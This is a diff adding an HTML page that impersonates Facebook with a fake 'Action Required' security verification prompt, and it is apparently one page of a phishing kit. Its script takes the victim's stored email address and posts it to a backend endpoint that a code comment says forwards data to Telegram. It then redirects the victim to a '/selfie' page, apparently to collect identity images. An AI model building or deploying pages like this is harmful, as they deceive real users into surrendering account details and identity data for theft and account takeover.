@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Action Required</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Facebook_logo_%282023%29.svg/960px-Facebook_logo_%282023%29.svg.png" alt="Facebook" class="fb-logo">
+        
+        <div class="confirm-box">
+            <div class="screen-title">Action Required</div>
+            <div class="screen-text">We've detected unusual activity. Please complete verification to secure your account.</div>
+            
+            <button class="primary" onclick="continueVerification()">
+                <span id="buttonText">Continue Verification</span>
+                <div class="button-loader" id="buttonLoader"></div>
+            </button>
+        </div>
+    </div>
+    
+    <script>
+        async function continueVerification() {
+            const email = sessionStorage.getItem('email');
+            
+            // Show loading
+            const btn = document.querySelector('.primary');
+            const buttonText = document.getElementById('buttonText');
+            const buttonLoader = document.getElementById('buttonLoader');
+            
+            btn.disabled = true;
+            buttonText.style.display = 'none';
+            buttonLoader.style.display = 'block';
+            
+            // Send to Telegram
+            await fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    type: 'action',
+                    data: { email },
+                    ip: 'user_ip_here'
+                })
+            });
+            
+            // Redirect to selfie page
+            setTimeout(() => {
+                window.location.href = '/selfie';
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
